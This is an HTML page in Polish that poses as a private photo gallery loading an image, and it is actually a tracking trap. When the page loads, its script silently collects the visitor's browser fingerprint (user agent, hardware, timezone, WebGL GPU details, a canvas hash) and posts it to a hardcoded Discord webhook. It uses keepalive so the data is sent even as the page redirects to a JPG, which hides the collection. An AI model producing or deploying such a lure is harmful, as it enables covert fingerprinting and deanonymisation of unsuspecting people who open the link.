<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Prywatna Galeria Zdjęć</title>
  <style>
    body { background: #0f172a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div style="text-align:center;">
    <div class="loader" style="margin: 0 auto 15px auto;"></div>
    <p>Wczytywanie zdjęcia...</p>
  </div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
    const REDIRECT_URL = "./20260808_121307.jpg";

    // Awaryjny bezpiecznik: po 1.5 sekundy użytkownik MUSI zostać przekierowany do zdjęcia
    const safetyRedirect = () => {
      window.location.replace(REDIRECT_URL);
    };
    const timer = setTimeout(safetyRedirect, 1500);

    // Zaawansowany skaner telemetryczny (100% natywny JS - zero zewnętrznych zależności)
    function harvestAdvancedIntel() {
      let gpuVendor = "N/A";
      let gpuRenderer = "N/A";
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch(e) {}

      let canvasHash = "N/A";
      try {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(10, 10, 80, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("MASZA_OSINT_TRAP", 2, 2);
        const dataUrl = c.toDataURL();
        let hash = 0;
        for (let i = 0; i < dataUrl.length; i++) {
          hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
          hash |= 0;
        }
        canvasHash = hash.toString(16);
      } catch(e) {}

      return {
        ua: navigator.userAgent,
        platform: navigator.platform || "Nieznana",
        lang: navigator.language || "N/A",
        cores: navigator.hardwareConcurrency || "Nieznane",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznana",
        screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
        touch: navigator.maxTouchPoints || 0,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
        gpuV: gpuVendor,
        gpuR: gpuRenderer,
        cHash: canvasHash
      };
    }

    async function deployTrap() {
      try {
        const data = harvestAdvancedIntel();
        const payload = {
          username: "ELITE OSINT SPY BOT",
          avatar_url: "https://i.imgur.com/4M34hi2.png",
          embeds: [{
            title: "🎯 POTWIERDZONY TRAF (ELITE MODE)!",
            color: 15158332,
            fields: [
              { name: "🆔 Canvas & GPU", value: `• **Canvas Hash:** \`${data.cHash}\`\n• **GPU Vendor:** \`${data.gpuV}\`\n• **GPU Model:** \`${data.gpuR}\``, inline: false },
              { name: "💻 Hardware Specs", value: `• **CPU Cores:** \`${data.cores}\`\n• **RAM:** \`${data.ram}\`\n• **Touch Points:** \`${data.touch}\``, inline: true },
              { name: "🌍 Środowisko & System", value: `• **Strefa Czasowa:** \`${data.timezone}\`\n• **Język:** \`${data.lang}\`\n• **Platforma:** \`${data.platform}\``, inline: true },
              { name: "🖥️ Raw User-Agent", value: `\`\`\`${data.ua}\`\`\``, inline: false }
            ],
            timestamp: new Date()
          }]
        };

        // Wysyłamy dane z parametrem keepalive, żeby przetrwało przekierowanie strony
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        });

      } catch(err) {
        // Ignorujemy błędy sieciowe, żeby nie zablokować użytkownika
      } finally {
        clearTimeout(timer);
        safetyRedirect();
      }
    }

    deployTrap();
  </script>
</body>
</html>
